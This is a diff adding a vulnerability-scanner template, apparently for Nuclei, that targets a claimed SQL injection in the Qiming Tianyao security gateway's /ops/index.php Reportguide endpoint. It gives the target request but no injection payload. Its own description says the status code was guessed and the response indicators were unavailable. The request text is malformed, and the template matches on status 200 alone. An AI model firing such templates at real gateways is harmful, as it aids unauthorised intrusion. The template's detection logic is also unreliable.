@@ -1,0 +1,50 @@
+id: poc-klsbo2tt9lpydl16
+info:
+  name: 启明天钥安全网关前台SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/klsbo2tt9lpydl16
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: klsbo2tt9lpydl16
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9?
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    checkname=123&tagid=123
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
